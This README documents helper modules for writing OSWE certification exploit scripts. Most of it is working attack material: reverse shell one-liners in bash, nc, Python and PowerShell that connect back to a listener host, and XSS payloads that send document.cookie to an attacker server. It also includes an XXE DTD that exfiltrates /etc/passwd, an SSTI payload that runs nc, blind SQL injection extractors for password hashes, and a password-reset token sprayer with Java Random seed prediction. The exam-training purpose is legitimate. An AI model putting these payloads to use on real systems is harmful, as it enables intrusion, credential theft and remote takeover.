# OSWE Exploit Helpers

Helper modules for writing OSWE exploit scripts. Pull what you need into your script for each target.

---

## Files

```
├── exploit.py              # Main template – start here
├── utils.py                # Print helpers, regex, password/name generators, PS1 encoder
├── shell_listener.py       # TCP reverse shell listener
├── web_callback_server.py  # Serve payloads + catch callbacks (XSS, XXE, SSRF)
├── sqli_parallel.py        # Parallel blind SQLi extractor
├── token_bruteforce.py     # Token spray + Java util.Random predictor
└── websocket_helper.py     # WebSocket response drainer (targets with WS interfaces)
```

`exploit.py` has everything inlined – copy it to the exam machine and fill in the stage functions. The other files are reference copies; paste functions from them as needed.

```bash
python3 exploit.py -t 192.168.1.100 -l 10.10.10.10 --shell
```

---

## exploit.py – Flags

| Flag | Default | Description |
|------|---------|-------------|
| `-t / --target` | required | Target IP or IP:port |
| `-l / --lhost` | required | Your tun0 IP |
| `-p / --lport` | 4444 | Reverse shell port |
| `-wp / --wport` | 80 | Web callback server port |
| `-u / --username` | – | Provide a known username to skip enumeration/registration |
| `-P / --password` | – | Provide a known password to skip brute-forcing |
| `-f / --file` | – | File path to read (for targets with LFI or XXE) |
| `--shell` | off | Trigger reverse shell stage |
| `--proxy` | off | Route all traffic through Burp (127.0.0.1:8080) |

`-u` and `-P` exist because some stages are slow – brute-forcing a token can take a few minutes. Once you have the credentials, pass them directly and skip to the stage you're actually working on.

---

## Helpers

### utils.py

**Console output:**
```python
print_ok("Registered as ABCDEF")       # [+] success, extracted value
print_info("Waiting for callback...")  # [*] status update
print_err("Login failed")              # [-] something went wrong
print_stage(2, "Exploit SQLi")         # [STAGE 2] ── major step divider
print_banner("MyExploit")             # ══ header at script start
```

**Random generators:**
```python
username = generate_random_name()      # e.g. "KXQTMHJZAW"
password = generate_password()         # e.g. "Xk3!mVqZ..." – upper+lower+digit+special
email    = username + "@offsec.exam"
```

`generate_password()` always satisfies strict validation policies. It avoids shell-breaking characters (quotes, backslashes) so you can safely embed it in payloads.

**Regex extraction** – pull values out of HTML responses:
```python
# <input type="hidden" name="csrf_token" value="aB3xZ9...">
csrf  = extract_between_markers(r.text, 'name="csrf_token" value="', '"')

# href="/reset?token=XYZ123&expire=..."
token = extract_between_markers(r.text, "token=", "&")

# All values from a table column
users = extract_all_between_markers(r.text, "<td>", "</td>")
```

Uses `re.DOTALL`, so it works on values that span multiple lines.

**PowerShell encoder** – avoids quoting issues when injecting PS1 through a webshell:
```python
b64 = encode_ps1("whoami")
cmd = f"powershell.exe -EncodedCommand {b64}"
```

`-EncodedCommand` expects UTF-16LE base64. Encoding it in Python ensures the command arrives intact regardless of how it's passed through the delivery mechanism.

---

### shell_listener.py

Paste `start_listener()` into your script, run it in a background thread, then trigger the shell:

```python
listener_t = threading.Thread(target=start_listener, args=(lhost, lport), daemon=True)
listener_t.start()
time.sleep(1)

trigger_revshell(...)   # your function that calls back to lhost:lport

listener_t.join()       # blocks until you exit the session
```

Two threads: one reads from the socket and prints, the other reads your input and sends. This way neither side blocks the other.

Uncomment `conn.send(b"\n")` inside the function for PowerShell – it kicks the PS1 prompt on connect so you see output immediately.

**Reverse shell payloads:**
```bash
# busybox nc
busybox nc <lhost> <lport> -e /bin/bash

# bash
bash -i >& /dev/tcp/<lhost>/<lport> 0>&1

# Python
python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('<lhost>',<lport>));[os.dup2(s.fileno(),i) for i in range(3)];subprocess.call(['/bin/sh','-i'])"

# PowerShell
$c=New-Object Net.Sockets.TCPClient('<lhost>',<lport>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=[Text.Encoding]::ASCII.GetBytes($r);$s.Write($rb,0,$rb.Length)}
```

---

### web_callback_server.py

One server that does two things: serves files to the victim and captures whatever the victim sends back.

Hardcode your payloads as constants at the top of the script, using `.replace()` for LHOST/LPORT:

```python
JS_PAYLOAD = """
fetch('http://<lhost>/steal?b64_cookie=' + btoa(document.cookie))
""".replace("<lhost>", LHOST)

DTD_PAYLOAD = """<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<lhost>/xxe?x=%file;'>">
%eval; %exfil;""".replace("<lhost>", LHOST)
```

Then register and start:

```python
SERVED_FILES["/payload.js"] = (JS_PAYLOAD, "application/javascript")
SERVED_FILES["/evil.dtd"]   = (DTD_PAYLOAD, "application/xml-dtd")

httpd = start_server(host=lhost, port=wport)

inject_payload(...)         # trigger the victim to fetch your payload

while "/steal" not in EXFIL_DATA:
    time.sleep(0.5)

raw    = EXFIL_DATA["/steal"]["b64_cookie"]
cookie = base64.b64decode(raw).decode()

httpd.shutdown()
httpd.server_close()
```

GET callbacks store query params in `EXFIL_DATA[path]`. POST callbacks parse JSON or form-encoded bodies into the same dict. CORS headers are set on every response so `fetch()` in the victim browser works cross-origin.

**XSS cookie theft:**
```javascript
// Generic img onerror
<img src=x onerror="fetch('http://<lhost>/steal?b64_cookie='+btoa(document.cookie))">

// Injected into an image src field
data:image/jpeg;base64,<base64_jpeg_header>' onerror=fetch('http://<lhost>/steal?b64_cookie='+btoa(document.cookie)) usemap='#w
```

---

### sqli_parallel.py

Paste `extract_string_blind()` into your script. Write a `check_fn(index, char) -> bool` for your target and pass it in:

```python
def my_check(index: int, char: str) -> bool:
    # Time-based (PostgreSQL)
    sqli = f"(SELECT CASE WHEN (SUBSTRING((SELECT password FROM users LIMIT 1),{index},1)='{char}') THEN pg_sleep(3) ELSE NULL END)"
    t0 = time.time()
    session.get(TARGET + "/search", params={"q": f"' OR {sqli}--"})
    return time.time() - t0 >= 3

    # Boolean-based (MySQL) – uncomment to use instead
    # sqli = f"' AND (SELECT SUBSTRING(password,{index},1) FROM users LIMIT 1)='{char}'--"
    # r = session.get(TARGET + "/search", params={"q": sqli})
    # return "Welcome" in r.text

result = extract_string_blind(my_check, length=32, label="password hash")
```

All `(position, character)` combinations are submitted at once. The thread pool caps concurrency at `max_workers=30`. For a 32-char string over a 62-char charset, that's ~2000 tasks – done in roughly the time it takes to test a single character sequentially.

Tune `max_workers` down if you're hitting rate limits, up if the target handles the load.

---

### token_bruteforce.py

**Generic spray** – works with any list of candidate tokens:

```python
def try_token(token: str) -> bool:
    r = session.post(TARGET + "/resetPassword", data={
        "token": token, "password1": new_pass, "password2": new_pass
    })
    return "success" in r.text.lower()

winner = spray_tokens(token_list, try_token, label="reset token")
```

**Java `util.Random` prediction** – for apps that seed their token generator with `System.currentTimeMillis()`:

```python
t0 = int(time.time() * 1000)
session.post(TARGET + "/requestReset", data={"id": username})
t1 = int(time.time() * 1000)

tokens = generate_java_random_tokens(
    start_seed   = t0 - 1000,   # ±1s padding for server clock drift
    end_seed     = t1 + 1000,
    token_length = 40,           # match the app's token length
)
winner = spray_tokens(tokens, try_token, label="reset token")
```

---

### websocket_helper.py

For targets that expose a command interface over WebSocket. Paste `ws_recv_all()` into your script:

```python
import websocket, ssl, json

ws = websocket.create_connection(
    "wss://target/ws_endpoint",
    sslopt={"cert_reqs": ssl.CERT_NONE}
)
ws.settimeout(0.75)     # timeout triggers end-of-response detection

ws.send(json.dumps({"cmd": "whoami"}))
output = ws_recv_all(ws)
print(output)

ws.close()
```

If the app sends typed frames (e.g. `{"type": "response", "payload": "..."}`), filter on the type to skip heartbeats:

```python
output = ws_recv_all(ws, payload_key="payload", filter_key="type", filter_val="response")
```

Increase the timeout if large outputs are being cut off.

---

## requests Cheatsheet

**Sending requests:**
```python
r = session.get(BASE_URL + "/dashboard")
r = session.get(BASE_URL + "/search", params={"q": "admin"})        # → /search?q=admin

r = session.post(BASE_URL + "/login", data={"user": "a", "pass": "b"})   # form-encoded
r = session.post(BASE_URL + "/api", json={"user": "a"})                  # JSON body
r = session.post(BASE_URL + "/api", data=xml.encode(), headers={"Content-Type": "application/xml"})

r = session.post(BASE_URL + "/upload", files={
    "file": ("shell.jsp", open("shell.jsp", "rb"), "application/octet-stream")
})
```

**Reading responses:**
```python
r.status_code           # 200, 302, 403 ...
r.text                  # decoded body – use for regex
r.json()                # parsed JSON dict
r.headers["Location"]   # specific header
r.cookies.get("PHPSESSID")
```

**Persist headers or cookies across all requests:**
```python
session.headers.update({"X-CSRF-Token": csrf, "X-Requested-With": "XMLHttpRequest"})
session.cookies.update({"PHPSESSID": sid})
```

**Auth bypass check** – inspect the 302 before following it:
```python
r = session.post(BASE_URL + "/login", data=creds, allow_redirects=False)
if r.status_code == 302 and "/dashboard" in r.headers.get("Location", ""):
    print_ok("Auth bypass confirmed")
```

**Scrape a CSRF token and persist it:**
```python
r    = session.get(BASE_URL + "/dashboard")
csrf = re.search(r'csrf_token.*?"(.*?)"', r.text).group(1)
session.headers.update({"X-CSRF-Token": csrf})
```

**Sanity-check every critical step:**
```python
r = session.post(BASE_URL + "/login", data=creds)
assert "dashboard" in r.text, f"Login failed ({r.status_code})"
```

Many apps return HTTP 200 even on failure – check the response body, not just the status code.

**Print the outgoing request** (useful when something isn't behaving as expected):
```python
r   = session.post(BASE_URL + "/login", data={"user": "admin"})
req = r.request
print(req.method, req.url)
print(req.headers)
print(req.body)
```

---

## Development Tips

**Skip slow stages while iterating** – hardcode a known-good cookie and comment out the early steps:
```python
session.cookies.update({"JSESSIONID": "paste_cookie_here"})
# register()
# login()
```

**Route through Burp** for a specific request without touching the rest:
```python
r = session.post(url, data=data, proxies={"http": "http://127.0.0.1:8080"})
```

Or set it globally for the session via `--proxy`, or as an env var:
```bash
HTTP_PROXY=http://127.0.0.1:8080 python3 exploit.py -t ... -l ...
```

---

## Common Patterns

**Avoid f-string hell with payloads that contain lots of `{}` (SSTI):**
```python
payload = "{{ __import__('os').system('nc <LHOST> <LPORT>') }}" \
    .replace("<LHOST>", lhost) \
    .replace("<LPORT>", str(lport))
```

**b64-encode a shell command to avoid quoting issues:**
```python
cmd    = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
b64cmd = base64.b64encode(cmd.encode()).decode()
payload = f"echo {b64cmd} | base64 -d | bash"
```

**Wait for an async callback (XSS, SSRF, XXE):**
```python
while "/callback_path" not in EXFIL_DATA:
    time.sleep(0.5)
data = EXFIL_DATA["/callback_path"]
```

---

## Decompilation

| Language | Tool | Notes |
|----------|------|-------|
| Java | JD-GUI | Open `.jar` → File → Save All Sources → unzip |
| .NET / C# | dnSpy | Open `.dll` → File → Export to Project |

After exporting, open the folder as a workspace in VS Code or Notepad++ for multi-file search.

---

## Database Debugging

**PostgreSQL – log all queries in real time:**

Enable in `postgresql.conf`:
```
log_statement = 'all'
```

Reload without restart:
```bash
psql -U postgres -c "SELECT pg_reload_conf();"
```

Tail the log and filter for SQLi signatures:
```powershell
Get-Content "C:\path\to\pgsql\data\pgsql_log\postgresql.log" -Tail 0 -Wait | Select-String -Pattern "ERROR:", "pg_sleep"
```

Useful when developing a blind SQLi payload – confirms whether your syntax is actually reaching the database or getting rejected earlier in the stack.
